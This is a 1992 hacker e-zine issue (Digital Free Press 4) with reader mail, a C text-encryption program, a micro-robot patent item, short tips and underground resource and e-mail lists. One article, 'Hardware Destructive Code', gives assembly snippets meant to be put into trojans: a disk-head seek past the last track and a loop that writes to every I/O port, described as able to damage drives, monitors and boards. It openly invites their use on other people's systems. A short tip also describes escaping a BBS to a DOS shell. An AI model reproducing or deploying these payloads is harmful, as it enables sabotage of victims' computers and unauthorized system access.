  Dick Ellis  (812) 855-4240  ellis@ucs.indiana.edu

JVNCnet   US and International
  Sergio Heker  (800) 35TIGER market@jvnc.net
        Allison Pihl

Los Nettos  Los Angeles Area (CA)
  Ann Westine Cooper  (213) 822-1511  los-nettos-request@isi.edu

MichNet/Merit Michigan (MI)
  Jeff Ogden  (313) 764-9430  jogden@merit.edu

MIDnet    Mid US (NE, OK, AR, MO, IA, KS, SD)
  Dale Finkelson  (402) 472-5032  dmf@westie.unl.edu

MRnet   Minnesota (MN)
  Dennis Fazio  (612) 342-2570  dfazio@mr.net

MSEN            Michigan (MI)
  Owen Medd (313) 741-1120  info@msen.com

NEARnet   Northeastern US (ME NH VT CT RI MA)
  John Curran   (617) 873-8730  nearnet-staff@nic.near.net

netILLINOIS Illinois (IL)
  Joel L. Hartman (309) 677-3100  joel@bradley.bradley.edu

NevadaNet Nevada (NV)
  Don Zitter  (702) 784-6133  zitter@nevada.edu

NorthwestNet  Northwestern US (WA OR ID MT ND WY AK)
  Eric Hood (206) 562-3000  ehood@nwnet.net

NYSERnet  New York (NY)
  Jim Luckett (315) 443-4120  info@nysernet.org

OARnet    Ohio (OH)
  Alison Brown  (614) 292-8100  alison@oar.net

PACCOM    Hawaii (HI) and Australia, Japan, Korea, New Zealand, Hong Kong
  Torben Nielsen  (808) 956-3499  torben@hawaii.edu

PREPnet   Pennsylvania (PA)
  Thomas Bajzek (412) 268-7870  twb+@andrew.cmu.edu

PSCNET    Eastern US (PA, OH, WV)
  Eugene Hastings (412) 268-4960  pscnet-admin@psc.edu

PSINet    US and International
  PSI, Inc. (800) 82PSI82 info@psi.com

Sesquinet Texas (TX)
  Farrell Gerbode (713) 527-4988  farrell@rice.edu

SDSCnet   San Diego Area (CA)
  Paul Love (619) 534-5043  loveep@sds.sdsc.edu

SURAnet   Southeastern US (WV, VA, SC, NC, TN, KY, LA, MS, AL, GA, FL)
  Jack Hahn (301) 982-4600  hahn@sura.net

THEnet    Texas (TX)
  Tracy LaQuey Parker  (512) 471-2444  tracy@utexas.edu

VERnet    Virginia (VA)
  James Jokl  (804) 924-0616  jaj@virginia.edu

Westnet   Western US (AZ, CO, ID, NM, UT, WY)
  Pat Burns (303) 491-7260  pburns@yuma.acns.colostate.edu

WiscNet   Wisconsin (WI)
  Tad Pinkerton (608) 262-8874  tad@cs.wisc.edu

WVNET   West Virginia (WV)
  Harper Grimm  (304) 293-5192  cc011041@wvnvms.wvnet.edu

-------------------------------------------------------------------------
Providers Based Outside the United States of America
-------------------------------------------------------------------------

AARNet    Australia
  AARNet Support  +61 6 249 3385  aarnet@aarnet.edu.au

UKnet   United Kingdom of Great Britain and Northern Ireland
  UKnet Support +44-227-475497  postmaster@uknet.ac.uk

EUnet           Europe, CIS-region, and Northern Africa
  EUnet Support   +31 20 592-5124 glenn@eu.net


--------
------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

    Well folks, thats all for DFP #3. Information needed for future articles:

    1. Hacker and Computer Underground Resources: Magazines, Journals, BBSes,
           Archives, etc. If you have any information to share please e-mail
           complete details to hackers%underg@uunet.uu.net. The information
           will be summarized in a future article.

    2. E-Mail addresses of famous people. If you know of any e-mail addresses
           of famous people please e-mail them. All sources will be kept
           confidential. If you are a famous person, and do not want to be on
           the list please send e-mail (heheh).

    Keep that e-mail coming!

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                            -= Max Cray =-
 Internet:   underg!max@uunet.uu.net                         Support
 UUCP:       ...!uunet!underg!max                            Free
 Data:       The Underground Computing Foundation BBS        Software
             401-847-2603 -=- 9600 baud (v.32)               (w/src)
 CI$:        76334,2203


-------------------------------------------------------------------------------

              #########             ############       #########
              ###########           ############       ###########
              ####    ####          ####               ####    ####
              ####    ####          ####               ####    ####
              ####    ####          ########           ###########
              ####    ####          ########           #########
              ####    ####          ####               ####
              ####    ####          ####               ####
              ###########           ####               ####
              #########             ####               ####

                             DIGITAL FREE PRESS
-------------------------------------------------------------------------------
                    Volume 1.0                Issue 4.0
-------------------------------------------------------------------------------

       * A Publication of The Underground Computing Foundation (UCF) *

       * Send Subscription Requests to: dfp-req%underg@uunet.uu.net *

            * Send Submissions to: hackers%underg@uunet.uu.net *

              * Editor: Max Cray (max%underg@uunet.uu.net) *

        Back issues can be found in the CUD archives at ftp.eff.org

                 [Note: BBS is not currently up. Sorry.]
------------------------------------------------------------------------------

                    Statement of Purpose and Disclaimer

    The Digital Free Press is an uncensored forum to document current
activities in and of the world of modern technology. It is published under the
premise that it is better to know, rather than not know, so no attempt is made
to hide any information no matter how dangerous it may be. Information is a
double edged sword. It is neither good nor bad, and can be used for either
good or bad. Warning: Some information in this document could be used for
illegal activities. Use at your own risk. Articles are the opinion of the
authors listed, and not of the editor (unless of course the editor wrote
it). Information is not verified for accuracy.

------------------------------------------------------------------------------
------------------------------------------------------------------------------

In this Issue:

    1. Mail to Max
    2. Privacy and Electronic Mail by GodNet Raider
    3. Hardware Destructive Code by The BBC
    4. Invisible Killer Chips by Jean-Bernard Condat
    5. Short Takes:
       - Hacking Remote Access by PeeWee
       - Little Black Book of Viruses Review by PeeWee
       - Where to find Online Library Catalogs, and
         How to get info about DEC's new Alpha chip by Wes Morgan
       - Compiling C programs on a VMS system by Max Cray
    6. Paid Advertisement by UPi
    7. FutureCulture (Condensed) by Hawkeye

------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

Mail to Max:
-----------

Date: Tue, 28 Apr 92 14:05 GMT
From: Jean-Bernard Condat 
To: Max Cray 
Subject: RE: DFP #3 Bounce Test

Dear Max:

The scene in France is very clear: nothing. The police look at what the
Chaos Computer Club france (CCCF) make... and the secret services work
on several formations for all the people! A lot of anti-virus softwares
are available, but some softs are sell with viruses in it (!). I paid
US$1,000 pro week like Craig Neidorf... because I "have perhaps possess
one hard-to-find NUI"! I mind that the US hacking market is the same:
you have some blue box codes available, the French hackers have some
"Carte Pastel Internationale" codes... and France Telecom don't make any
thing against that. Only some poor teenagers are arrested, but in 60%,
they don't found the good people!

Can I help you?

Jean-Bernard Condat, General Secretary, CCCF
B.P. 8005
69351 Lyon Cedex 08, France

[Editor's note: Of course you can help! Send all your information to:
                hackers%underg@uunet.uu.net and I will try to edit it
                to make it even more useful, and then I will publish
                it in the DFP!]

-----------------------------------------------------------------------------

From: Root of all Evil Account 
Subject: Re: Digital Free Press #3
To: underg!max (Max Cray)
Date: Sun, 26 Apr 92 19:38:24 EDT
X-Mailer: ELM [version 2.3 PL11]

Dear Mr. Cray,

    Recently, 4 users of this system complained about receiving
copies of your "Digital Free Press".  As the distribution site for Phrack,
I in no way discourage freedom of electronic speech.  I do, however,
discourage "cyber junk-mail".  Each of the users mentioned they had not
specifically asked for this to be sent to them.

    In the future, please verify any subscriptions of your newsletter
through me.

            The Root of all Evil at StormKing.Com

[Editor's note: 'Mr. Cray' ... I like that!]

------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

From: gnr@tsf.UUCP (GodNet Raider)
Date: Wed, 26 Feb 92 05:17:53 EST
Organization: The CyberUnderground


                      -=[ Privacy and electronic mail ]=-

                                     -or-

                    /*************************************/
                    /* How to whisper over a crowded net */
                    /*************************************/

                                - written by -
                                 GodNet Raider
                                    - of -
                             The CyberUnderground

 -=[ "Information is the greatest weapon of power to the modern wizard." ]=-

]----------------------------------------------------------------------------[

Introduction:
-------------

        A while back I was listening to a pro password sysop talk about the
    'evils' of hacking. His biggest point was that 'a hacker could read
    private mail from/to the person whose' account they have accessed. The
    right or wrong of that point I will leave to others to discuss/flame/get
    flamed over. What stuck with me was the fact that he like many other
    sysops and system admin, their friends and whoever else can access the
    system at high level (or in the case of DOS, can pound the local
    keyboard), can also read any text messages they wish. Some even feel that
    it is a god given right to read any mail, strange seeing that the
    government and even ma bell (remember the phone chase from _the_cuckoo_
    nest_ they could not get the phone number for they did not have a valid
    warrant in in that state) must get a search WARRANT to do the same thing.
    Well it seems what they feel god has giveth them, GodNet Raider can
    taketh away.

        So I thought there must be a simple way to make truly private
    messages to protect all from this 'hacker threat' and nosey sysops
    (etc..) as well (without having to resort to using DES and uuencode,
    for it is slow and a bit of a hassle to use a lot (but it should be noted
    this is the most secure method). Then I remembered an article I read
    in The LOD/H Technical Journal, Issue #3. [Editor's note: The Legion
    of Doom Technical Journals can be found in the CUD archives at
    ftp.eff.org. Highly recommended.] It contained a basic BASIC
    program and explanation to a simple text encryption method using
    cellular automatons by The Mentor (strongly recommended reading for
    understanding the theory behind the method).

        After converting the BASIC code for the second program to C (under
    Minix) I proceeded to make changes to (hopefully improve) it. What
    I came up with is included at the end of this file (MsgLock.c).

        Of the changes made:

            Added the use of stdin/stdout to support a wide extent of I/O
            methods.

            Used multiple cells in defining shift amount.

            Allowed the pass though of char.s not in aszValid array (raw
            output) to keep message integrity (returns and tabs that a
            message may gain/lose in some online editors).

            Added code to expand small key strings to fill out key cells.

        So I hope you find MsgLock of use and remember...

                WMIe`H-h(`[ga0)9oW-/V

MsgLock wish list/projects:
---------------------------

    MsgLock is by no means complete following are some suggestions for
    the obsessed prodigies out there who want to expand on the basic idea.

        For a more private version one can change:

            The size of the key cells (#define WIDTH xx).

            The expansion methods used to fill out the initial key cells.

            The key cell update method.

            The order of the char.s in aszValid.

            Adding/removing char.s from aszValid.

        Msglock could use a way to know when an encoded area begins and
        ends (like the 'begin'/'end' in uuencoded files) to save post
        processing on net messages.

        Removal of char.s used in quoted messages so that it will not try
        to process (cook) char.s added to quoted messages.

        Changes to allow it to be treated like a ASCII Xfer protocol in
        term packages (qmodem, boyan, kermit)/online by bbs packages (RBBS,
        etc..) as an auto encrypt for chat/general online use.

        Or many others I have not thought of.

MsgLock source code:
--------------------

        MsgLock was compiled in Minix using the ACK compatible compiler and
    under DOS using Turbo C++ using ANSI C compatible commands.

    Usage:
        msglock [-d] Key

            -d(code)    : Decode stdin to stdout (MsgLock otherwise
                            encodes stdin to stdout. -d is only
                            used for decoding if followed by a
                            space and is the first parameter following
                            the command ('-dKEY' will be used as a key
                            to encode stdin, use '-d -dKEY' instead to
                            decode)

            Key            : String of char. used to encode/decode stdin
                            to stdout. String can contain spaces.

    Examples:

        msglock key file2.txt
            Encode file 'file1.txt' to 'file2.txt' using the key string
            'key'.

        msglock -d this is the key com1 (/dev/tty1 for minix users)
            Encode keyboard input (using the key 'knowledge is power')
            directly to the device/terminal on com port 1.

 +---- Cut Here ----+---- Cut Here ----+---- Cut Here ----+---- Cut Here ---+

/*
    MsgLock.c
        by GodNet Raider.
            Based on a program for encrypting using cellular automaton
                by The Mentor

    Allows encoding of text for transmittal over computer nets and BBSs.

    This program is not to DES standards and should not be considered 100%
    secure by any means.
*/

#include 
#include 
#include 
#include 

#define TRUE 1
#define FALSE 0
#define SPACE 0x20
#define WIDTH 50
#define MAX_CELLS (WIDTH + 2)

char
    *aszErrMsg [] =
        {
         "Usage: msglock [-d(ecode)] Key",
         "Write error on stdout.",
         "Read error on stdin."
        },
    asCells [2] [MAX_CELLS],
    /* Not using 0 offset to prevent errors caused by the fact that */
    /* (0 % x == x % x).                                            */
    aszValid [] = "\xff\ABCDEFGHIJKLMNOPQRST"
                    "yz1234567890!@#$%^&*()-=_+[]{};:'.><,/?\\| \`\"",
    fActive = 0,
    fDecode = FALSE;

void
    main (int, char **),
    FatalErr (int);

void main (argc, argv)
int
    argc;
char
    *argv [];
{
    char
        sWorkKey [WIDTH],
        cInChar;
    int
        nArgCnt = 1,
        nTmpCnt1 = 1,
        nTmpCnt2 = 0,
        nValidSize;

    nValidSize = strlen (aszValid) - 1;
    /* Check for missing parameters. */
    if (argc == 1)
        FatalErr (1);
    /* Check if decode, else default to encode */
    if (*argv [1] == '-' && toupper (argv [1] [1]) == 'D' && !argv [1] [2])
        {
         /* Check for missing parameters, again. */
         if (argc < 3)
            FatalErr (1);
         fDecode = TRUE;
         nArgCnt++;
        }
    /* Move key in to encode/decode key cells to the max set by WIDTH. */
    while (nTmpCnt1 <= WIDTH && nArgCnt < argc)
        if (argv [nArgCnt] [nTmpCnt2])
             asCells [1] [nTmpCnt1++] =
                argv [nArgCnt] [nTmpCnt2++];
        else
            if (++nArgCnt < argc)
                {
                 asCells [1] [nTmpCnt1++] = SPACE;
                 nTmpCnt2 = 0;
                }
    nTmpCnt2 = 1;
    /* Fill unused cells in key cells up to WIDTH. */
    while (nTmpCnt1 <= WIDTH)
        asCells [1] [nTmpCnt1++] = asCells [1] [nTmpCnt2++] ^
            asCells [1] [nTmpCnt1 - 1];
    /* Process stdin. */
    while ((cInChar = (char) getc (stdin)) != EOF)
        {
         /* Check if char. is in aszValid list, if so cook, */
         /* else let it pass though raw. */
         nTmpCnt2 = nValidSize;
         while (nTmpCnt2 && aszValid [nTmpCnt2] != cInChar)
            nTmpCnt2--;
         if (nTmpCnt2)
            {
             /* Update key cells, excluding head and tail. */
             for (nTmpCnt1 = 1; nTmpCnt1 <= WIDTH; nTmpCnt1++)
                asCells [fActive] [nTmpCnt1] =
                    asCells [fActive ^ 1] [nTmpCnt1 - 1] ^
                    (asCells [fActive ^ 1] [nTmpCnt1] |
                    asCells [fActive ^ 1] [nTmpCnt1 + 1]);
             /* Update head of key cells. */
             asCells [fActive] [0] =
                asCells [fActive ^ 1] [WIDTH + 1] ^
                (asCells [fActive ^ 1] [0] |
                asCells [fActive ^ 1] [1]);
             /* Update tail of key cells. */
             asCells [fActive] [WIDTH + 1] =
                asCells [fActive ^ 1] [WIDTH] ^
                (asCells [fActive ^ 1] [WIDTH + 1] |
                asCells [fActive ^ 1] [0]);
             /* Get char shift offset value */
             cInChar = (asCells [fActive] [1] & 0x7f) % WIDTH;
             /* Get char shift value */
             cInChar = asCells [fActive] [(cInChar ? cInChar : WIDTH)];
             /* Switch to updated key cells for next pass. */
             fActive ^= 1;
             /* If decode is TRUE then shift left though aszValid, else  */
             /* shift right (negative numbers in cInChar reverses this). */
             if (fDecode)
                {
             /* Needed to bypass warning message (turbo C++ gets   */
             /* confused sometimes when it sees a single '=' in    */
             /* an 'if' statement, even though it is bracket to be */
             /* evaluated before the 'if').                        */
#ifdef __TURBOC__
                 if ((cInChar = nTmpCnt2 - cInChar) != 0)
#else
                 if ((cInChar = nTmpCnt2 - cInChar))
#endif
                     {
                      if ((cInChar %= nValidSize) < 1)
                        cInChar = nValidSize + cInChar;
                    }
                 else
                     cInChar = nValidSize;
                }
             else
                 if (!(cInChar = (nTmpCnt2 + cInChar) % nValidSize))
                    cInChar = nValidSize;
             /* Write cooked char. to stdout. */
             if (putc (aszValid [cInChar], stdout) == EOF &&
                ferror (stdout))
                FatalErr (2);
            }
         else
             /* Write raw char. to stdout. */
            if (putc (cInChar, stdout) == EOF && ferror (stdout))
                FatalErr (2);
        }
    /* Check for file error on stdin. */
    if (ferror (stdin))
        FatalErr (3);
    /* End program run. */
    exit (0);
}

void FatalErr (ErrNum)
int
    ErrNum;
{
    /* In every life a little rain must fall. */
    /* Complain and bail out.                 */
    fprintf (stderr, "\n%s\n", aszErrMsg [ErrNum - 1]);
    exit (ErrNum);
}

 +---- Cut Here ----+---- Cut Here ----+---- Cut Here ----+---- Cut Here ---+

]============================================================================[

 ...uunet!underg!tsf!gnr (GodNet Raider)
         -=[ "You gotta learn to listen, before you learn to play." ]=-

------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

To: hackers@tsf.UUCP
Subject: Text phile 5.
From: bbc@tsf.UUCP (The BBC)
Organization: The CyberUnderground

    Da da.. da da dup... Da da.. da da dup... Da da.. da da dup...
Yes boys and girls... It time once again for your favorite waste
of humanity... Yes it the BBC's Hackit J. Squirrel and crashwinkel
The moose show... So put your antlers on and lets now go to the
magical land of frostbite Falls Min. An see what our heroes are up
to...

    Golly gee Hack... Every time I crash a sysops hard drive with
a trojan... they just reformat the drive and reinstall the
software and are up and running again... I wish there was a way
to bring them down that would really give them something to think
about...

    Maybe there is lets go see Mr. Woopie and his 3D BBC,
crashwinkel...

    So our HEROES went to see Mr. Woopie... But where confronted
by Tennessee tuxedo and his friend chumly... But a quick squeeze
of the trigger on their semi automatic weapons and a short thank
you note to the NRA... An they where in...

    So you boys want to know how to cause more than just data loss
with trojans? Well lets ask the 3D BBC...

    Thank you Mr. Woopie... It sounds like you boys want to hear
about how to force hardware problems using software... 'Wow
Hacket.I only thought you could only do major data loss with
trojans.'... Yes but there are other nasties you could pull if you
want to...

    Take this simple bit of code for example:

    ===============================================================
     mov Ax, 0508h
     mov CX, 8001h
     mov DX, 0000h
     int 13
    ===============================================================

    This small bit of codes just moves the disk heads past the inner
most track... 'But what good is that BBC?'... Well our furry little
friend... Some disks will lock and the only way to fix it is to open
the bugger up... An since the only way to be sure this will or won't
work is to try it... Well...

    Or how about this bit of code:

    ===============================================================
             xor Al, Al
     NextPass:
             mov DX,ffffh
     NextPort:
             out DX, AL
             dec DX
             jnz NextPort
             inc AL
             jmp short NextPass
    ===============================================================

    We like to call it armageddon... 'Ohhh, Ahhhh'... It simply
looks for and writes to every port in the system... An based
on the hardware in the system it can... Toast monitors, Change CMOS
values, Change stepper rates, Change voltages (to burn/disable cards,
boards, and memory), Reek havoc on co-processers, Disable networks,
As well as other nasties too numerous to mention... Seeing that there
is some time involved in writing all those ports... The poor fool
has some time to guess what is going on and shut the computer down
(oh about 4 min.)... 'But we can't test things like that on our
computers.' 'How will we know if it will work or not.'... Who said
to test it on your systems... Not that we would suggest you test
it on others systems... That would make you a wast of humanity
like...

The BBC

----------------------------------------------------------------------
 ...uunet!galaxia!divinity!tsf!bbc (The BBC)
             -=[ "Anarchy is never HAVING to say you're sorry." ]=-

------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

Invisible Killer Chips Now Available


Intelligence Newsletter (10 rue du Sentier, 75002 Paris, France)
No. 186 (Jan. 29, 1992), page 2, ISSN 0997-7139
By: Jean-Bernard Condat (CCCF, B.P. 8005, 69351 Lyon Cedex 08, France)


  The military use of computer viruses is often overblown, if not just
simple disinformation as in the recent Iraqi case. But researchers at
Boston University have developed and patented (U.S. patent 5 049 775)
an infinitely more offensive and effective anti-computer agent: the
silicon ant. Micro-electronics has perfected technologies for making
toys and machines so small that they are invisible.

  Using piezoelectric ceramics which expand or contract under an
electric current, the researchers constructed a microscopic ship with
three "legs" on each side and a "cutter" in front. By alternating
current in different sides of each "leg", it bends forward or backward.

  Under remote control the killer chips can be "walked" into a computer
and cut up other microscopic chips, turn around and "walk" away, leaving
invisible damage in the computer system. The killer chips could be solar
powered and therefore have an indefinite life-span.


                             PATENT DESCRIPTION


008245420  WPI Acc No: 90-132421/17
XRPX Acc No: N90-102550
   Piezoelectric micro-machine or robot basic operating unit - made by
    covering silicon cantilever beams projecting from frame with
    piezoelectric material when applied voltages cause them to deflect
Patent Assignee: (UYBO-) BOSTON UNIV
Author (inventor): SMITS J G
Number of Patents: 002
Patent Family:
    CC Number    Kind     Date      Week
    WO 9003665     A     900405     9017   (Basic)
    US 5049775     A     910917     9140
Priority Data (CC,No,Date): US 251565 (880930);
Applications (CC,No,Date): WO 89US4129 (890921);
EP and/or WO Language: English
EP and/or WO Cited Patents:
    No.SR.Pub
Designated States (National): JP (Regional): AT; BE; CH; DE; FR; GB; IT; LU
    ; NL; SE

Abstract (Basic): WO 9003665

         An electrical micromachine is made by securing films (20,22) of
    piezoelectric material to the top surfaces (16,18) of crystalline
    silicon beams (12,14) projecting from a crystalline silicon body (10)
    to form a bimorph structure. A potential applied across the ends
    (24,26) of the piezoelectric films causes the beams to deflect. The
    piezoelectric material used is zinc oxide.
          A number of such micromachines can be assembled to form a robot,
    and when a foot (30) is provided the machine can move itself along a
    surface by sequential deflecting and straightening of the beams. The
    foot can be associated with a toothed wheel to produce rotary motion.
    The micromachine may be solar powered, and can be associated with
    sensors or a microprocessor with programmable memory.
          USE - Microsurgical tools, and robots for grasping, carrying or
    cutting tasks. @(33pp Dwg.No.1/10)@

Abstract (US): 9140 US 5049775

         The piezoelectric actuation machine comprises two cantilever beams
    extending from a frame. The beams comprise a piezoelectric material
    such that application of an electric potential across the material of
    each beam rotationally diplaces the first and second beams relative to
    each other.
           An actuating member is secured between displaceable surfaces on
    the beams and extends orthogonally from a plane through the beams such
    that relative displacement of the beams displaces a portion of the
    member in a direction orthogonal to beam displacement. A rigid object
    contacting the displaced portion of the member is translated relative
    to the member and the frame.
         USE - For piezoelectric micromachines e.g. small robot or cutting
    tool. @(17pp)@

File Segment: EPI
Derwent Class: S05; V06; X25; R46;
Int Pat Class: H01L-041/09
Manual Codes (EPI/S-X): S05-B; V06-M06D; X25-A03E


Jean-Bernard Condat
General Secretary
Chaos Computer Club France
B.P. 8005
69351 Lyon Cedex 08, France
Tel.: +33 78 61 15 88


------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

Short Takes:
-----------

------------------------------------------------------------------------------

From: uunet!uga.cc.uga.edu!ART30275%NUSVM.BITNET (PeeWee)

    Hey, press alt-200 (on the numberpad) to access the highest level
   menu in Remote Access v1.10. Often lets u shell out to DOS.

------------------------------------------------------------------------------

From: uunet!CUNYVM.CUNY.EDU!ART30275%NUSVM.bitnet (PeeWee)

      Hey! have you got your copy of The little black book of
                                          Computer viruses yet?

          It's very detailed and good! I had to order it and have it
     shipped over here to me, took me about 3 months (worth the wait!)
  The ISBN is 0-929408020 Author: Mark Ludwig, Publisher: American Eagle

------------------------------------------------------------------------------

From: Wes Morgan 

Obligatory Information Pointers:

    List of Online Library Catalogs:
       Anonymous ftp from ftp.unt.edu (129.120.1.1) in directory /pub/library.
       Versions are available in plaintext, PostScript, and WordPerfect 5.0.

[Editor's note: With these lists of online library catalogs you can find out
                much information by learning what libraries have the info
                that you need, and then requesting it via an inter-library
                loan.]

    DEC's new Alpha chip (for you hardware fanatics):
       Call 1-800-332-2717 and ask for the "Alpha Packet".  They'll send you
       the Architecture Handbook (detailed) and more information about the
       Alpha chip.

------------------------------------------------------------------------------

From: Max Cray 

    On a VMS system you can not simply type 'CC HELLO.C' to compile a C
program. First you have to define a Link Library. This command will work
for a generic program that does not need floating point:

    DEFINE LNK$LIBRARY SYS$LIBRARY:VAXCRTL

    For more information use the excellent help system in VMS. Simply Type
'HELP CC'.

------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

                         PAID POLITICAL ADVERTISEMENT

UPi has once again returned and it no longer the shit group it used to be in
the past.  UPi is a group that puts out newsletters that deals with the
H/P/C/A world.  In the past, our newsletters averaged only 1 article in length
(which in size means a range of 25-50k) but now in the all new UPi newsletter
we have decided to expand it so it will contain more articles (and all quality
articles which means no more of those little shitty files that contains
useless information).  What we are looking for are quality members and sites
that are willing to contribute to the group and support the group.  We are
also looking for people who can freelance write for us too.  We are looking
for people who are experienced in electronics and chemistry, and as well as
any of the P/H/C/A topics.  If you would like to join UPi either as a site or
a member or become a freelance writer for us please send mail to The Lost
Avenger via internet e-mail to the following address Tla@Maria.Wustl.Edu or
you can contact him on his voice mail box at 416-402-0788.

The Lost Avenger/UPi

------------------------------------------------------------------------------
##############################################################################
------------------------------------------------------------------------------

From: uunet!isis.cs.du.edu!ahawks (floyd)
Subject: FutureCulture Update
To: hackers%underg@uunet.uu.net
Date: Tue, 12 May 92 20:38:20 MDT

[Editor's note: This is an edited version of Hawkeye's excellent e-mail
FutureCulture listing. It is intended to deal with the entire CyberPunk/Rave
scene and thus is rather large and comprehensive. I edited out most of the
cultural listings, and left most of the tech listings, since I intend for
the DFP to be more of a technical journal. However it is highly recommended
that you send him mail and get on the mail list.]

_____________________________________________________________________________
                                       |                                     |
                                       |   Magazines (hardcopy) of interest: |
                                       |_____________________________________|

Communications of the ACM
(Association for Computing Machinery, Inc.)
        -sorry, don't have the address or subscription info, but should be
         available at any decent newsstand - also, the ACM has forums
         available on the Internet

Cybertek
OCL/Magnitude
PO Box 64
Brewster, NY   10509
        -hacking, cyberpunks, technology, culture
         $10 a year

Fact Sheet Five
6 Arizona Avenue
Rensselaer, NY   12144-4502
518.479.3707
        -independently-oriented reviewers of the culture
         $3.50 an issue, $33 a year for 8 issue subscriptions
     (unconfirmed rumors say it's no longer in production)

Hac-Tic
pb 22953, 1100 DL
Amsterdam, The Netherlands
ropg@ooc.uva.nl (Internet)
        -published near that hotbed of hackers in holland/amsterdam
         European counterpart to 2600
         $2.30 US an issue

[Editor's note: The above is not in English! Is there a translator?]

Intertek:  The Cyberpunk Journal
Steve Steingerg
325 Ellwood Beach #3
Goleta, CA   93117
steve@cs.ucsb.edu
        -formerly Frank Drake's W.O.R.M
         hacking, cyberspace, interviews, designer drugs, cryonics, etc.
         $2.50 an issue

Iron Feather Journal
PO Box 1905
Boulder, CO   80306
        -hacking, anarchy, techno-phun
         $2 an issue

Mondo 2000
PO Box 10171
Berkeley, CA    94709
415.845.9018 (phone)
415.649.9630 (fax)
mondo2000@mcimail.mci.com
        -your definitive guide to all things cyberpunk and some things not
         should be available at any decent newsstand
         was Reality Hackers and High Frontiers
         $21 for 5 issues (published quarterly)

TAP
PO Box 20264
Louisville, KY   40250
        -the original phreaker's rag, begun by Abbie Hoffman
         formerly YIPL (Youth International Party Line) and then it was
           Technilogical Assistance Program, now it's
           Technilogical Advancement Party
         hacking, anarchy, some political
         has undergone many publishing changes
         operates Blitzkrieg BBS @ 502.499.8933
         TAP-Online also available on some BBSes / FTP sites

2600
PO Box 752
Middle Island, NY   11953-0752
516.751.2600 (office)
516.751.2608 (fax)
2600@well.sf.ca.us (Internet)
        -the original infamous hacker's zine
         subscriptions are $21 for 4 issues (published quarterly)
         back issues are $25 / year

[Editor's note: They also have meetings on the first friday of the month in
                New York City.]

Whole Earth Review
PO Box 38
Sausalito, CA   94966-9932
(Whole Earth runs The Well [Whole Earth Lectronic Link] - well.sf.ca.us)
        -combines new age, techno-culture, california fads, etc.
         should be available at any decent newsstand
         $20 year for subscriptions

____________________________________________________________________________
                                              |                             |
                                              |   E-Magazines and digests:  |
                                              |_____________________________|

[Editor's note: I edited out the listings that did not have references on how
to get them. Suffice it to say that there are many more journals available
that are not listed here. See some of the Internet and BBS listings for
places to find these items.]

Activist Times Incorporated
gzero@tronsbox.xei.com
        -political, hacking, anarchy

Computers and Academic Freedom
listserv@eff.org 
        -computing freedom, mostly deals with college campuses

Computer Underground Digest
tk0jut2@niu.bitnet

Digital Free Press
dfp-req%underg@uunet.uu.net
        -hacking, information, etc.

EFF News (EFFector Online)
effnews-request@eff.org
        -sends out EFFector Online, the Electronic Frontier foundation's
                e-journal

Freaker's Bureau International
au530@cleveland.freenet.edu
        -anarchy, hacking, cyberpunk

Informatik
inform@doc.cc.utexas.edu
        -hacking, phreaking, computer underground, cyberpunk, etc.

Network Information Access
nia@nuchat.sccsi.com
        -hacking, computer underground, etc.

Phantasy
Mercenary@f515.n141.z1.fidonet.org
        -anarchy, hacking

Phrack
phracksub@stormking.com
        -need we say more - the one, the only hacking e-zine...

Pirate Radio
brewer@ace.enet.dec.com
        -pirate radio

RISKS Digest
risks-request@csl.sri.com
        -the RISKS of computing in our lives

Telecom Privacy Digest
telecom-priv-request@pica.army.mil
        -deals with privacy aspects of telecommunications
         most of the conversation revolves around Caller-ID and such

Telecom Digest
telecom-request@eecs.nwu.edu
        -deals with all aspects of telecommunications

Virus-l Digest
krvw@cert.sei.cmu.edu
(also virus-l on BITNET)
        -discussion of viruses and all aspects of 'em

Worldview - Der Weltanschauung
fox@nuchat.sccsi.com
        -hacking, computer underground, church of subgenius, political, etc.

_____________________________________________________________________________
                                                        |                    |
                                                        |  E-Mail Addresses: |
                                                        |____________________|

(please use care and consideration when mailing to these people)

Aristotle                       uk05744@ukpr.uky.edu
John Perry Barlow               barlow@well.sf.ca.us
Dorothy Denning                 denning@cs.georgetown.edu
Peter J Denning                 pjd@cs.gwu.edu
Desert Fox                      dfox@taronga.com
Dispater                        dispater@stormking.com
The EFF                         eff@eff.org
Freaker's Bureau Int'l          au530@cleveland.freenet.edu
Gatsby                          gatsby@ryptyde.tcs.com
Mike Godwin                     mnemonic@eff.org
Emmanuel Goldstein              emmanuel@well.sf.ca.us
Ground Zero                     gzero@tronsbox.xei.com
Hactic                          ropg@ooc.uva.nl
Hawkeye (put this art. together)ahawks@nyx.cs.du.edu
Intertek                        steve@cs.ucsb.edu
Judge Dredd                     elisem@nuchat.sccsi.com
Mitch Kapor                     mkapor@eff.org
Knight Lightning (Craig Neidorf)knight@well.sf.ca.us
                                kl@stormking.com
Lord Macduff                    macduff@nuchat.sccsi.com
Mentor (Lloyd Blankenship)      cs.utexas.edu!dogface!fnordbox!loydb
Mondo 2000                      mondo2000@mcimail.mci.com
Gordon Meyer                    72307.1502@compuserve.com
Peter G Neumann                 neumann@csl.sri.com
Pengo (Hans Heubner)            hans@trabant.at
John S Quarterman               jsq@tic.com
Len Rose                        len@netsys.netsys.com
RU Sirius                       rusirius@well.sf.ca.us
Cliff Stoll                     cliff@cfa.harvard.edu
Michael Synergy                 synergy@metaphor.com
Jim Thomas                      tk0jut1@niu.bitnet
Tuc                             tuc@stormking.com
2600                            2600@well.sf.ca.us

[Editor's note: How about Eric S. Raymond author of 'The New Hacker's
                Dictionary'? He is at: eric@snark.thyrsus.com.

Also Belgorath provides these alternate addresses:

Hans Huebner (aka Pengo) is hans@trabant.artcom.de, or
                            hans@skoda.vie.artcom.de

Cliff Stoll (No known alias) is stoll@earthquake.berkeley.edu]

_____________________________________________________________________________
                                                              |              |
                                                              |   FTP Sites: |
                                                              |______________|

(all of these sites carry either computer underground information, information
on drugs, music, subgenius, etc.)

18.26.0.36                      lcs.mit.edu
18.26.0.179                     zurich.ai.mit.edu
128.6.4.15                      pyrite.rutgers.edu
